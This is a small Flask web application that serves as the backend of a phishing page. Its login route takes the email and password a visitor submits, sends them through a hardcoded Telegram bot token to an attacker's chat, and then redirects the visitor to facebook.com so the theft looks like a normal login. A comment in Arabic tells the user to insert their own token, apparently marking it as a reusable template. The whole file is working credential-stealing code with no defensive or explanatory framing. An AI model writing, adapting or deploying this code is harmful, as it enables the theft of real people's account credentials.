import os
from flask import Flask, render_template, request, redirect
import requests

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')
    # التوكن تاعك
    token = "7547614066:AAH3_M0L5v0uM0_u3Ym0-u9Z"
    chat_id = "5304381534"
    msg = f"📧: {email}\n🔑: {password}"
    requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={msg}")
    return redirect("https://facebook.com")

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

